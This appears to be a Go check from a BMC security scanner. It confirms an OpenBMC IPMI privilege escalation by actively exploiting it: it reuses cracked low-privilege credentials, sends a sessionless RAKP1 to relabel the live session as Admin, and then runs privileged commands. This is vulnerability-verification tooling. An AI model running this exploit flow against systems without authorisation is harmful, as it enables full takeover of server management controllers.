package check

import (
	"context"
	"fmt"
	"strings"

	"github.com/runZeroInc/oobscan/pkg/engine"
	"github.com/runZeroInc/oobscan/pkg/ipmi"
)

func init() {
	Register(Check{
		Name:        "ipmi.openbmc.rakp1ActiveRelabel",
		Description: "Verify OpenBMC phosphor-net-ipmid active-session RAKP1 relabel privilege escalation: a low-privilege authenticated session is promoted to Admin by sending a sessionless RAKP1 naming an Admin user on the same BMC session ID",
		Category:    "auth",
		Applies:     Applicability{Classes: []engine.DeviceClass{engine.ClassBMC}},
		// Not Authenticated: that flag means the operator must supply a credential and
		// Selector.allow skips such a check unless --creds was passed or it was named
		// explicitly. This check sources its session from scan evidence instead
		// (selectRelabelCheckFlow reads ipmi.auth's cracked credentials and the OpenBMC
		// setup-state probe), so the flag would make it dead in every default scan.
		// ipmi.postAuthEnum is the precedent: it also discovers its own credentials.
		Enabled: true,
		Run:     runOpenBMCRelabelCheck,
	})
	RegisterExplain("ipmi.openbmc.rakp1ActiveRelabel", explainOpenBMCRelabelCheck)
}

// RelabelProbeResult captures the full evidence chain for the active-session
// relabel privilege escalation.
type RelabelProbeResult struct {
	LowPrivUser          string
	AdminUser            string
	Suite                int
	BeforeSetPrivCC      byte
	BeforeSetPrivSuccess bool
	RAKP1Status          byte
	AfterSetPrivCC       byte
	AfterSetPrivSuccess  bool
	AfterSetPrivGranted  byte
	ProviderCmdCC        byte
	ProviderCmdDataLen   int
	UserAccessCC         byte
	UserAccessData       []byte
}

func runOpenBMCRelabelCheck(ctx context.Context, t *engine.Target) []engine.Finding {
	if t == nil || t.DisableLogins {
		return nil
	}
	var out []engine.Finding
	_, flow, ok := selectRelabelCheckFlow(t)
	if !ok {
		out = append(out, ensureRelabelCheckEvidence(ctx, t)...)
		_, flow, ok = selectRelabelCheckFlow(t)
	}
	if !ok {
		return out
	}
	probe := probeActiveRelabel(t, flow)
	if probe == nil {
		return out
	}
	out = append(out, relabelProbeToFinding(probe))
	return stampIPMI(out, t.IPMIPort())
}

// ensureRelabelCheckEvidence runs the credential battery when this check is
// scheduled ahead of the one that normally produces its inputs.
//
// It is restricted to the OpenBMC family on purpose. ipmi.openBmcSetupState is
// only ever written for phosphor-net-ipmid derivatives (maybeProbeOpenBMCSetupState
// gates on isLikelyOpenBMC), so on any other BMC the second Evidenced() lookup can
// never succeed and the battery is re-run for nothing. This check is
// device-specific, so ForIdentity places it ahead of the cross-vendor
// ipmi.defaultCreds on every BMC-class host: without the gate each such host paid
// two full RAKP batteries, doubling session-slot pressure on rate-limiting BMCs and
// emitting every credential finding twice.
func ensureRelabelCheckEvidence(ctx context.Context, t *engine.Target) []engine.Finding {
	if ctx == nil || t == nil {
		return nil
	}
	if _, ok := t.Evidenced("ipmi.auth"); ok {
		if _, ok := t.Evidenced("ipmi.openBmcSetupState"); ok {
			return nil
		}
	}
	if !isLikelyOpenBMC(t, identityVendor(t)) {
		return nil
	}
	return runIPMICreds(ctx, t)
}

// selectRelabelCheckFlow picks the low-priv credential and admin relabel target.
// Returns false if preconditions are not met.
func selectRelabelCheckFlow(t *engine.Target) (*ipmi.AuthReport, ipmi.AuthFlow, bool) {
	if t == nil || t.DisableLogins {
		return nil, ipmi.AuthFlow{}, false
	}
	var auth *ipmi.AuthReport
	if v, ok := t.Evidenced("ipmi.auth"); ok {
		auth, _ = v.(*ipmi.AuthReport)
	}
	if auth == nil || auth.Suite == nil {
		return nil, ipmi.AuthFlow{}, false
	}
	v, ok := t.Evidenced("ipmi.openBmcSetupState")
	if !ok {
		return nil, ipmi.AuthFlow{}, false
	}
	setup, _ := v.(*ipmi.OpenBMCSetupProbe)
	if setup == nil || !setup.AdminPrivAccepted || strings.TrimSpace(setup.Username) == "" {
		return nil, ipmi.AuthFlow{}, false
	}
	// The relabel target is setup.Username, and the setup-state probe inherits that
	// name from the first verified entry of this same list: maybeProbeOpenBMCSetupState
	// passes firstValidRAKPUsername(rep) to ipmi.ProbeOpenBMCSetupState, which stores it
	// verbatim. The skip below is therefore not an occasional tie-break, it always
	// rejects the first verified entry, so a second distinct account must have been
	// cracked on the same host before any low-privilege candidate exists. That is why
	// the check is rare rather than broken. Keep the skip: relabelling an account to
	// itself demonstrates nothing, and probeActiveRelabel would in any case abandon it
	// at the step-1 negative control, since a nominee holding Admin passes the
	// pre-relabel Set Session Privilege that step requires to fail.
	for _, cr := range auth.Cracked {
		if !cr.Verified || cr.PasswordType == "smcrakp-fixed-key" {
			continue
		}
		if strings.TrimSpace(cr.Username) == "" || strings.TrimSpace(cr.Password) == "" {
			continue
		}
		if cr.Username == setup.Username {
			continue
		}
		return auth, ipmi.AuthFlow{
			Version:     "2.0",
			Mode:        "openbmcRelabel",
			Username:    cr.Username,
			Password:    cr.Password,
			RelabelUser: setup.Username,
			Suite:       *auth.Suite,
			Source:      "ipmi.openbmc.rakp1ActiveRelabel",
		}, true
	}
	return nil, ipmi.AuthFlow{}, false
}

// probeActiveRelabel runs the 5-step verification, returning nil if any step
// fails in a way that means the vulnerability is not confirmed:
//  1. Open low-priv session, attempt Set Session Privilege Admin (must fail)
//  2. Send sessionless RAKP1 naming the admin user on the active BMC session ID
//  3. Attempt Set Session Privilege Admin again (must succeed)
//  4. Execute a provider command (Get Device ID) to confirm privileged access
//  5. Execute Get User Access to retrieve privileged admin data
func probeActiveRelabel(t *engine.Target, flow ipmi.AuthFlow) *RelabelProbeResult {
	s, err := ipmi.OpenSession20User(t.Host, t.IPMIPort(), flow.Username, flow.Password, flow.Suite, t.Timeout)
	if err != nil {
		return nil
	}
	defer s.Close()

	// Step 1: Before relabel, Admin privilege must not be available.
	beforeAdmin, err := s.RequestSessionPrivilege(0x04)
	if err != nil {
		return nil
	}
	if beforeAdmin.Success {
		// Already admin - not a relabel finding; low-priv user is actually admin.
		return nil
	}

	// Step 2: Send sessionless RAKP1 naming the admin user.
	r2, err := s.RelabelActiveSession(flow.RelabelUser, 0x04)
	if err != nil || r2 == nil || r2.ErrorCode != 0 {
		return nil
	}

	// Step 3: After relabel, Admin privilege must succeed.
	afterAdmin, err := s.RequestSessionPrivilege(0x04)
	if err != nil || !afterAdmin.Success {
		return nil
	}

	// Step 4: Provider command (Get Device ID) must work.
	devCC, devData, err := s.Exec(ipmi.NetFnApp, ipmi.CmdGetDeviceID, nil)
	if err != nil || devCC != 0x00 || len(devData) == 0 {
		return nil
	}

	// Step 5: Privileged Get User Access must return data.
	uaCC, uaData, err := s.Exec(ipmi.NetFnApp, ipmi.CmdGetUserAccess, []byte{0x01, 0x01})
	if err != nil || uaCC != 0x00 || len(uaData) == 0 {
		return nil
	}

	return &RelabelProbeResult{
		LowPrivUser:          flow.Username,
		AdminUser:            flow.RelabelUser,
		Suite:                flow.Suite.Suite,
		BeforeSetPrivCC:      beforeAdmin.CC,
		BeforeSetPrivSuccess: beforeAdmin.Success,
		RAKP1Status:          r2.ErrorCode,
		AfterSetPrivCC:       afterAdmin.CC,
		AfterSetPrivSuccess:  afterAdmin.Success,
		AfterSetPrivGranted:  afterAdmin.Granted,
		ProviderCmdCC:        devCC,
		ProviderCmdDataLen:   len(devData),
		UserAccessCC:         uaCC,
		UserAccessData:       uaData,
	}
}

func relabelProbeToFinding(probe *RelabelProbeResult) engine.Finding {
	fields := engine.F(
		"username", userLabel(probe.LowPrivUser),
		"relabelUser", userLabel(probe.AdminUser),
		"suite", fmt.Sprintf("%d", probe.Suite),
		"beforeSetPrivCc", fmt.Sprintf("0x%02x", probe.BeforeSetPrivCC),
		"rakp1Status", fmt.Sprintf("0x%02x", probe.RAKP1Status),
		"afterSetPrivCc", fmt.Sprintf("0x%02x", probe.AfterSetPrivCC),
		"afterSetPrivGranted", fmt.Sprintf("0x%02x", probe.AfterSetPrivGranted),
		"providerCmdCc", fmt.Sprintf("0x%02x", probe.ProviderCmdCC),
		"providerCmdDataLen", fmt.Sprintf("%d", probe.ProviderCmdDataLen),
		"userAccessCc", fmt.Sprintf("0x%02x", probe.UserAccessCC),
		"userAccessData", fmt.Sprintf("%x", probe.UserAccessData),
		"proof", fmt.Sprintf("beforeSetPrivCc=0x%02x rakp1Status=0x%02x afterSetPrivCc=0x%02x afterSetPrivGranted=0x%02x providerCmdDataLen=%d userAccessCc=0x%02x userAccessData=%x",
			probe.BeforeSetPrivCC,
			probe.RAKP1Status,
			probe.AfterSetPrivCC, probe.AfterSetPrivGranted,
			probe.ProviderCmdDataLen, probe.UserAccessCC, probe.UserAccessData),
	)
	return engine.Finding{
		Check:    "ipmi.openbmc.rakp1ActiveRelabel",
		Category: "auth",
		Risk:     "critical",
		CVE:      []string{"CVE-2026-16140"},
		Fields:   fields,
	}
}

func explainOpenBMCRelabelCheck(host string, f engine.Finding) string {
	fields := make(map[string]string, len(f.Fields))
	for _, fld := range f.Fields {
		fields[fld.Key] = fld.Val
	}
	var b strings.Builder
	fmt.Fprintf(&b, "## Active-Session RAKP1 Relabel Privilege Escalation\n\n")
	fmt.Fprintf(&b, "**Host:** %s\n\n", host)
	fmt.Fprintf(&b, "**Severity:** Critical - Low-privilege to Administrator privilege escalation without knowing the Admin password\n\n")
	fmt.Fprintf(&b, "### Summary\n\n")
	fmt.Fprintf(&b, "The OpenBMC phosphor-net-ipmid daemon on this host accepts a sessionless RAKP Message 1 ")
	fmt.Fprintf(&b, "targeting an already-active BMC session. This overwrites the session's authorization identity ")
	fmt.Fprintf(&b, "from a low-privilege user to an Administrator account without proving the Admin password. ")
	fmt.Fprintf(&b, "After relabeling, the attacker's existing session keys remain valid but the BMC treats the ")
	fmt.Fprintf(&b, "session as fully Admin-authorized, granting access to all privileged IPMI commands.\n\n")
	fmt.Fprintf(&b, "### Evidence\n\n")
	fmt.Fprintf(&b, "| Step | Field | Value |\n|------|-------|-------|\n")
	fmt.Fprintf(&b, "| Before | Set Session Privilege Admin | cc=%s |\n", fields["beforeSetPrivCc"])
	fmt.Fprintf(&b, "| Relabel | RAKP1 target user | %s |\n", fields["relabelUser"])
	fmt.Fprintf(&b, "| Relabel | RAKP1 status | %s |\n", fields["rakp1Status"])
	fmt.Fprintf(&b, "| After | Set Session Privilege Admin | cc=%s granted=%s |\n", fields["afterSetPrivCc"], fields["afterSetPrivGranted"])
	fmt.Fprintf(&b, "| After | Provider command (Get Device ID) | cc=%s len=%s |\n", fields["providerCmdCc"], fields["providerCmdDataLen"])
	fmt.Fprintf(&b, "| After | Get User Access | cc=%s data=%s |\n", fields["userAccessCc"], fields["userAccessData"])
	fmt.Fprintf(&b, "\n### Impact\n\n")
	fmt.Fprintf(&b, "Any network-reachable attacker with a valid low-privilege IPMI credential (e.g. a USER-level account) ")
	fmt.Fprintf(&b, "can escalate to full Administrator. This enables reading/writing BMC configuration, user management, ")
	fmt.Fprintf(&b, "SOL console access, chassis power control, and firmware updates - full BMC takeover.\n\n")
	fmt.Fprintf(&b, "### Remediation\n\n")
	fmt.Fprintf(&b, "Update the OpenBMC firmware to a build that rejects RAKP Message 1 on sessions that have already ")
	fmt.Fprintf(&b, "completed RAKP authentication (i.e. are in ACTIVE state).\n")
	return b.String()
}
